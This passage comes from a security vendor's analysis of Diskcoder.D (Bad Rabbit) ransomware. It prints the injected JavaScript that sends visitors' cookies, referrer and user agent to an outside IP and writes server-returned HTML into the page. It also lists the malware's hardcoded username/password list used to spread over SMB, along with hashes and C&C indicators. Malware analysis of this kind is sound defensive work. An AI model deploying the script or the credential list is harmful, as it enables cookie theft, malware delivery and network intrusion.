class="crayon-sy">}</span><span class="crayon-h"> </span><span class="crayon-st">else</span><span class="crayon-h"> </span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-o">!</span><span class="crayon-o">!</span><span class="crayon-v">window</span><span class="crayon-sy">.</span><span class="crayon-v">ActiveXObject</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-62ea5ff9c06a1418337224-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-t">var</span><span class="crayon-h"> </span><span class="crayon-v">xhrs</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-s">'Microsoft.XMLHTTP'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">'Msxml2.XMLHTTP'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">'Msxml2.XMLHTTP.3.0'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">'Msxml2.XMLHTTP.6.0'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-62ea5ff9c06a1418337224-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">for</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-t">var</span><span class="crayon-h"> </span><span class="crayon-v">i</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">i</span><span class="crayon-h"> </span><span class="crayon-o">&lt;</span><span class="crayon-h"> </span><span class="crayon-v">xhrs</span><span class="crayon-sy">.</span><span class="crayon-v">length</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">i</span><span class="crayon-o">++</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-62ea5ff9c06a1418337224-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">try</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-62ea5ff9c06a1418337224-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">xhr</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">ActiveXObject</span><span class="crayon-sy">(</span><span class="crayon-v">xhrs</span><span class="crayon-sy">[</span><span class="crayon-v">i</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-62ea5ff9c06a1418337224-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">break</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-62ea5ff9c06a1418337224-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span><span class="crayon-h"> </span><span class="crayon-st">catch</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">e</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-62ea5ff9c06a1418337224-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-62ea5ff9c06a1418337224-13"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-62ea5ff9c06a1418337224-14"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-o">!</span><span class="crayon-o">!</span><span class="crayon-v">xhr</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-62ea5ff9c06a1418337224-15"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">xhr</span><span class="crayon-sy">.</span><span class="crayon-e">open</span><span class="crayon-sy">(</span><span class="crayon-s">'POST'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">'http://185.149.120\.3/scholargoogle/'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-62ea5ff9c06a1418337224-16"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">xhr</span><span class="crayon-sy">.</span><span class="crayon-v">timeout</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">10000</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-62ea5ff9c06a1418337224-17"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">xhr</span><span class="crayon-sy">.</span><span class="crayon-e">setRequestHeader</span><span class="crayon-sy">(</span><span class="crayon-s">'Content-Type'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">'application/x-www-form-urlencoded'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-62ea5ff9c06a1418337224-18"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">xhr</span><span class="crayon-sy">.</span><span class="crayon-v">onreadystatechange</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-t">function</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-62ea5ff9c06a1418337224-19"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">xhr</span><span class="crayon-sy">.</span><span class="crayon-v">readyState</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-cn">4</span><span class="crayon-h"> </span><span class="crayon-o">&amp;&amp;</span><span class="crayon-h"> </span><span class="crayon-v">xhr</span><span class="crayon-sy">.</span><span class="crayon-v">status</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-cn">200</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-62ea5ff9c06a1418337224-20"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-t">var</span><span class="crayon-h"> </span><span class="crayon-v">resp</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">xhr</span><span class="crayon-sy">.</span><span class="crayon-v">responseText</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-62ea5ff9c06a1418337224-21"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">resp</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-62ea5ff9c06a1418337224-22"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-t">var</span><span class="crayon-h"> </span><span class="crayon-v">fans</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">JSON</span><span class="crayon-sy">.</span><span class="crayon-e">parse</span><span class="crayon-sy">(</span><span class="crayon-v">resp</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-62ea5ff9c06a1418337224-23"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">fans</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-62ea5ff9c06a1418337224-24"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-t">var</span><span class="crayon-h"> </span><span class="crayon-v">an_s</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">decodeURIComponent</span><span class="crayon-sy">(</span><span class="crayon-v">fans</span><span class="crayon-sy">.</span><span class="crayon-v">InjectionString</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">replace</span><span class="crayon-sy">(</span><span class="crayon-c ">/\+/g</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">'%20'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-62ea5ff9c06a1418337224-25"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-t">var</span><span class="crayon-h"> </span><span class="crayon-v">da</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">document</span><span class="crayon-sy">.</span><span class="crayon-e">createElement</span><span class="crayon-sy">(</span><span class="crayon-s">'div'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-62ea5ff9c06a1418337224-26"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">da</span><span class="crayon-sy">.</span><span class="crayon-e ">id</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">'ans'</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-62ea5ff9c06a1418337224-27"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">da</span><span class="crayon-sy">.</span><span class="crayon-v">innerHTML</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">an_s</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-62ea5ff9c06a1418337224-28"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">document</span><span class="crayon-sy">.</span><span class="crayon-v">body</span><span class="crayon-sy">.</span><span class="crayon-e">appendChild</span><span class="crayon-sy">(</span><span class="crayon-v">da</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-62ea5ff9c06a1418337224-29"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-62ea5ff9c06a1418337224-30"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-62ea5ff9c06a1418337224-31"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-62ea5ff9c06a1418337224-32"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-62ea5ff9c06a1418337224-33"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-t">var</span><span class="crayon-h"> </span><span class="crayon-v">pd</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-62ea5ff9c06a1418337224-34"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">for</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-t">var</span><span class="crayon-h"> </span><span class="crayon-i">k</span><span class="crayon-h"> </span><span class="crayon-st">in</span><span class="crayon-h"> </span><span class="crayon-v">d</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-62ea5ff9c06a1418337224-35"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">d</span><span class="crayon-sy">.</span><span class="crayon-e">hasOwnProperty</span><span class="crayon-sy">(</span><span class="crayon-v">k</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-62ea5ff9c06a1418337224-36"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">pd</span><span class="crayon-sy">.</span><span class="crayon-e">push</span><span class="crayon-sy">(</span><span class="crayon-v">k</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-s">'='</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-v">d</span><span class="crayon-sy">[</span><span class="crayon-v">k</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-62ea5ff9c06a1418337224-37"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-62ea5ff9c06a1418337224-38"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-62ea5ff9c06a1418337224-39"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-t">var</span><span class="crayon-h"> </span><span class="crayon-v">dc</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">pd</span><span class="crayon-sy">.</span><span class="crayon-e">join</span><span class="crayon-sy">(</span><span class="crayon-s">'&amp;'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-62ea5ff9c06a1418337224-40"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">xhr</span><span class="crayon-sy">.</span><span class="crayon-e">send</span><span class="crayon-sy">(</span><span class="crayon-v">dc</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-62ea5ff9c06a1418337224-41"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-62ea5ff9c06a1418337224-42"><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-62ea5ff9c06a1418337224-43"><span class="crayon-e">e</span><span class="crayon-sy">(</span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-62ea5ff9c06a1418337224-44"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-s">'agent'</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">navigator</span><span class="crayon-sy">.</span><span class="crayon-v">userAgent</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-62ea5ff9c06a1418337224-45"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-s">'referer'</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">document</span><span class="crayon-sy">.</span><span class="crayon-v">referrer</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-62ea5ff9c06a1418337224-46"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-s">'cookie'</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">document</span><span class="crayon-sy">.</span><span class="crayon-v">cookie</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-62ea5ff9c06a1418337224-47"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-s">'domain'</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">window</span><span class="crayon-sy">.</span><span class="crayon-v">location</span><span class="crayon-sy">.</span><span class="crayon-v">hostname</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-62ea5ff9c06a1418337224-48"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-s">'c_state'</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-o">!</span><span class="crayon-o">!</span><span class="crayon-v">document</span><span class="crayon-sy">.</span><span class="crayon-i">cookie</span></div><div class="crayon-line" id="crayon-62ea5ff9c06a1418337224-49"><span class="crayon-sy">}</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0011 seconds] -->
<p>This script reports the following to 185.149.120[.]3, which doesn&#8217;t seem to respond at the moment.</p>
<ul>
<li>Browser User-Agent</li>
<li>Referrer</li>
<li>Cookie from the visited site</li>
<li>Domain name of the visited site</li>
</ul>
<p>Server side logic can determine if the visitor is of interest and then add content to the page. In that case, what we have seen is that a popup asking to download an update for Flash Player is shown in the middle of the page.</p>
<p><a href="/wp-content/uploads/2017/10/diskcoder.png"><img class="aligncenter size-large wp-image-102827" src="/wp-content/uploads/2017/10/diskcoder-1024x687.png" alt="" width="1024" height="687" srcset="https://www.welivesecurity.com/wp-content/uploads/2017/10/diskcoder-1024x687.png 1024w, https://www.welivesecurity.com/wp-content/uploads/2017/10/diskcoder-300x201.png 300w, https://www.welivesecurity.com/wp-content/uploads/2017/10/diskcoder-768x515.png 768w, https://www.welivesecurity.com/wp-content/uploads/2017/10/diskcoder-114x76.png 114w, https://www.welivesecurity.com/wp-content/uploads/2017/10/diskcoder-97x65.png 97w, https://www.welivesecurity.com/wp-content/uploads/2017/10/diskcoder.png 1137w" sizes="(max-width: 1024px) 100vw, 1024px" /></a></p>
<p>When clicking on the &#8220;Install&#8221; button, download of an executable file from <span style="font-family: 'courier new', courier, monospace;">1dnscontrol[.]com</span> is initiated. This executable file, <span style="font-family: 'courier new', courier, monospace;">install_flash_player.exe</span> is the dropper for Win32/Diskcoder.D.</p>
<p>Finally the computer is locked and the malware shows the ransom note:</p>
<p><a href="/wp-content/uploads/2017/10/mbr_cut.png"><img class="aligncenter size-full wp-image-102772" src="/wp-content/uploads/2017/10/mbr_cut.png" alt="" width="720" height="398" srcset="https://www.welivesecurity.com/wp-content/uploads/2017/10/mbr_cut.png 720w, https://www.welivesecurity.com/wp-content/uploads/2017/10/mbr_cut-300x166.png 300w, https://www.welivesecurity.com/wp-content/uploads/2017/10/mbr_cut-143x79.png 143w, https://www.welivesecurity.com/wp-content/uploads/2017/10/mbr_cut-298x165.png 298w" sizes="(max-width: 720px) 100vw, 720px" /></a></p>
<p>The payment page:</p>
<p><a href="/wp-content/uploads/2017/10/Screen-Shot-2017-10-24-at-2.18.32-PM.png"><img class="aligncenter size-large wp-image-102830" src="/wp-content/uploads/2017/10/Screen-Shot-2017-10-24-at-2.18.32-PM-1024x792.png" alt="" width="1024" height="792" srcset="https://www.welivesecurity.com/wp-content/uploads/2017/10/Screen-Shot-2017-10-24-at-2.18.32-PM-1024x792.png 1024w, https://www.welivesecurity.com/wp-content/uploads/2017/10/Screen-Shot-2017-10-24-at-2.18.32-PM-300x232.png 300w, https://www.welivesecurity.com/wp-content/uploads/2017/10/Screen-Shot-2017-10-24-at-2.18.32-PM-768x594.png 768w, https://www.welivesecurity.com/wp-content/uploads/2017/10/Screen-Shot-2017-10-24-at-2.18.32-PM.png 1125w" sizes="(max-width: 1024px) 100vw, 1024px" /></a></p>
<h2>Spreading via SMB</h2>
<p>Win32/Diskcoder.D has the ability to spread via SMB. As opposed to some public claims, it does <strong>not</strong> use the EternalBlue vulnerability like the Win32/Diskcoder.C (Not-Petya) outbreak. First, it scans internal networks for open SMB shares. It looks for the following shares:</p>
<ul>
<li>admin</li>
<li>atsvc</li>
<li>browser</li>
<li>eventlog</li>
<li>lsarpc</li>
<li>netlogon</li>
<li>ntsvcs</li>
<li>spoolss</li>
<li>samr</li>
<li>srvsvc</li>
<li>scerpc</li>
<li>svcctl</li>
<li>wkssvc</li>
</ul>
<p>Mimikatz is launched on the compromised computer to harvest credentials. A hardcoded list of usernames and passwords is also present.</p>

<table id="tablepress-423" class="tablepress tablepress-id-423">
<thead>
<tr class="row-1 odd">
	<th class="column-1">Usernames</th><th class="column-2">Passwords</th>
</tr>
</thead>
<tbody class="row-hover">
<tr class="row-2 even">
	<td class="column-1">Administrator</td><td class="column-2">Administrator</td>
</tr>
<tr class="row-3 odd">
	<td class="column-1">Admin</td><td class="column-2">administrator</td>
</tr>
<tr class="row-4 even">
	<td class="column-1">Guest</td><td class="column-2">Guest</td>
</tr>
<tr class="row-5 odd">
	<td class="column-1">User</td><td class="column-2">guest</td>
</tr>
<tr class="row-6 even">
	<td class="column-1">User1</td><td class="column-2">User</td>
</tr>
<tr class="row-7 odd">
	<td class="column-1">user-1</td><td class="column-2">user</td>
</tr>
<tr class="row-8 even">
	<td class="column-1">Test</td><td class="column-2">Admin</td>
</tr>
<tr class="row-9 odd">
	<td class="column-1">root</td><td class="column-2">adminTest</td>
</tr>
<tr class="row-10 even">
	<td class="column-1">buh</td><td class="column-2">test</td>
</tr>
<tr class="row-11 odd">
	<td class="column-1">boss</td><td class="column-2">root</td>
</tr>
<tr class="row-12 even">
	<td class="column-1">ftp</td><td class="column-2">123</td>
</tr>
<tr class="row-13 odd">
	<td class="column-1">rdp</td><td class="column-2">1234</td>
</tr>
<tr class="row-14 even">
	<td class="column-1">rdpuser</td><td class="column-2">12345</td>
</tr>
<tr class="row-15 odd">
	<td class="column-1">rdpadmin</td><td class="column-2">123456</td>
</tr>
<tr class="row-16 even">
	<td class="column-1">manager</td><td class="column-2">1234567</td>
</tr>
<tr class="row-17 odd">
	<td class="column-1">support</td><td class="column-2">12345678</td>
</tr>
<tr class="row-18 even">
	<td class="column-1">work</td><td class="column-2">123456789</td>
</tr>
<tr class="row-19 odd">
	<td class="column-1">other user</td><td class="column-2">1234567890</td>
</tr>
<tr class="row-20 even">
	<td class="column-1">operator</td><td class="column-2">Administrator123</td>
</tr>
<tr class="row-21 odd">
	<td class="column-1">backup</td><td class="column-2">administrator123</td>
</tr>
<tr class="row-22 even">
	<td class="column-1">asus</td><td class="column-2">Guest123</td>
</tr>
<tr class="row-23 odd">
	<td class="column-1">ftpuser</td><td class="column-2">guest123</td>
</tr>
<tr class="row-24 even">
	<td class="column-1">ftpadmin</td><td class="column-2">User123</td>
</tr>
<tr class="row-25 odd">
	<td class="column-1">nas</td><td class="column-2">user123</td>
</tr>
<tr class="row-26 even">
	<td class="column-1">nasuser</td><td class="column-2">Admin123</td>
</tr>
<tr class="row-27 odd">
	<td class="column-1">nasadmin</td><td class="column-2">admin123Test123</td>
</tr>
<tr class="row-28 even">
	<td class="column-1">superuser</td><td class="column-2">test123</td>
</tr>
<tr class="row-29 odd">
	<td class="column-1">netguest</td><td class="column-2">password</td>
</tr>
<tr class="row-30 even">
	<td class="column-1">alex</td><td class="column-2">111111</td>
</tr>
<tr class="row-31 odd">
	<td class="column-1"></td><td class="column-2">55555</td>
</tr>
<tr class="row-32 even">
	<td class="column-1"></td><td class="column-2">77777</td>
</tr>
<tr class="row-33 odd">
	<td class="column-1"></td><td class="column-2">777</td>
</tr>
<tr class="row-34 even">
	<td class="column-1"></td><td class="column-2">qwe</td>
</tr>
<tr class="row-35 odd">
	<td class="column-1"></td><td class="column-2">qwe123</td>
</tr>
<tr class="row-36 even">
	<td class="column-1"></td><td class="column-2">qwe321</td>
</tr>
<tr class="row-37 odd">
	<td class="column-1"></td><td class="column-2">qwer</td>
</tr>
<tr class="row-38 even">
	<td class="column-1"></td><td class="column-2">qwert</td>
</tr>
<tr class="row-39 odd">
	<td class="column-1"></td><td class="column-2">qwerty</td>
</tr>
<tr class="row-40 even">
	<td class="column-1"></td><td class="column-2">qwerty123</td>
</tr>
<tr class="row-41 odd">
	<td class="column-1"></td><td class="column-2">zxc</td>
</tr>
<tr class="row-42 even">
	<td class="column-1"></td><td class="column-2">zxc123</td>
</tr>
<tr class="row-43 odd">
	<td class="column-1"></td><td class="column-2">zxc321</td>
</tr>
<tr class="row-44 even">
	<td class="column-1"></td><td class="column-2">zxcv</td>
</tr>
<tr class="row-45 odd">
	<td class="column-1"></td><td class="column-2">uiop</td>
</tr>
<tr class="row-46 even">
	<td class="column-1"></td><td class="column-2">123321</td>
</tr>
<tr class="row-47 odd">
	<td class="column-1"></td><td class="column-2">321</td>
</tr>
<tr class="row-48 even">
	<td class="column-1"></td><td class="column-2">love</td>
</tr>
<tr class="row-49 odd">
	<td class="column-1"></td><td class="column-2">secret</td>
</tr>
<tr class="row-50 even">
	<td class="column-1"></td><td class="column-2">sex</td>
</tr>
<tr class="row-51 odd">
	<td class="column-1"></td><td class="column-2">god</td>
</tr>
</tbody>
</table>

<p>When working credentials are found, the <span style="font-family: 'courier new', courier, monospace;">infpub.dat</span> file is dropped into the Windows directory and executed through SCManager and <span style="font-family: 'courier new', courier, monospace;">rundll.exe</span>.</p>
<h2>Encryption</h2>
<p>Win32/Diskcoder.D is modified version of Win32/Diskcoder.C. Bugs in file encryption were fixed. The encryption now uses <a href="https://diskcryptor.net" target="_blank" rel="noopener">DiskCryptor</a>, an open source legitimate software used to do full drive encryption. Keys are generated using <span style="font-family: 'courier new', courier, monospace;">CryptGenRandom</span> and then protected by a hardcoded RSA 2048 public key.</p>
<p>Like before, AES-128-CBC is used.</p>
<h2>Distribution</h2>
<p>Interestingly, ESET telemetry shows that Ukraine accounts only for 12.2% of the total number of times we have seen the dropper component Here are the statistics:</p>
<ul>
<li>Russia: 65%</li>
<li>Ukraine: 12.2%</li>
<li>Bulgaria: 10.2%</li>
<li>Turkey: 6.4%</li>
<li>Japan: 3.8%</li>
<li>Other: 2.4%</li>
</ul>
<p>This pretty much matches the distribution of compromised websites that include the malicious JavaScript. So why does Ukraine seem to be more hit than the rest?</p>
<p>It&#8217;s interesting to note that all these big companies were all hit at the same time. It is possible that the group already had a foot inside their network and launched the watering hole attack at the same time as a decoy. Nothing says they fell for the &#8220;Flash update&#8221;. ESET is still investigating and we will post our finding as we discover them.</p>
<h2>Samples</h2>

<table id="tablepress-422" class="tablepress tablepress-id-422">
<thead>
<tr class="row-1 odd">
	<th class="column-1">SHA-1</th><th class="column-2">Filename</th><th class="column-3">ESET Detection name</th><th class="column-4">Description</th>
</tr>
</thead>
<tbody class="row-hover">
<tr class="row-2 even">
	<td class="column-1"><code>79116fe99f2b421c52ef64097f0f39b815b20907</code></td><td class="column-2">infpub.dat</td><td class="column-3">Win32/Diskcoder.D</td><td class="column-4">Diskcoder</td>
</tr>
<tr class="row-3 odd">
	<td class="column-1"><code>afeee8b4acff87bc469a6f0364a81ae5d60a2add</code></td><td class="column-2">dispci.exe</td><td class="column-3">Win32/Diskcoder.D</td><td class="column-4">Lockscreen</td>
</tr>
<tr class="row-4 even">
	<td class="column-1"><code>413eba3973a15c1a6429d9f170f3e8287f98c21c</code></td><td class="column-2"></td><td class="column-3">Win32/RiskWare.Mimikatz.X</td><td class="column-4">Mimikatz (32-bits)</td>
</tr>
<tr class="row-5 odd">
	<td class="column-1"><code>16605a4a29a101208457c47ebfde788487be788d</code></td><td class="column-2"></td><td class="column-3">Win64/Riskware.Mimikatz.X</td><td class="column-4">Mimikatz (64-bits)</td>
</tr>
<tr class="row-6 even">
	<td class="column-1"><code>de5c8d858e6e41da715dca1c019df0bfb92d32c0</code></td><td class="column-2">install_flash_player.exe</td><td class="column-3">Win32/Diskcoder.D</td><td class="column-4">Dropper</td>
</tr>
<tr class="row-7 odd">
	<td class="column-1"><code>4f61e154230a64902ae035434690bf2b96b4e018</code></td><td class="column-2">page-main.js</td><td class="column-3">JS/Agent.NWC</td><td class="column-4">JavaScript on compromised sites</td>
</tr>
</tbody>
</table>

<h2>C&amp;C servers</h2>
<p>Payment site: <span style="font-family: 'courier new', courier, monospace;">http://caforssztxqzf2nm[.]onion</span></p>
<p>Inject URL: <span style="font-family: 'courier new', courier, monospace;">http://185.149.120[.]3/scholargoogle/</span></p>
<p>Distribution URL: <span style="font-family: 'courier new', courier, monospace;">hxxp://1dnscontrol[.]com/flash_install.php</span></p>
<p>List of compromised sites:</p>
<ul>
<li>hxxp://argumentiru[.]com</li>
<li>hxxp://www.fontanka[.]ru</li>
<li>hxxp://grupovo[.]bg</li>
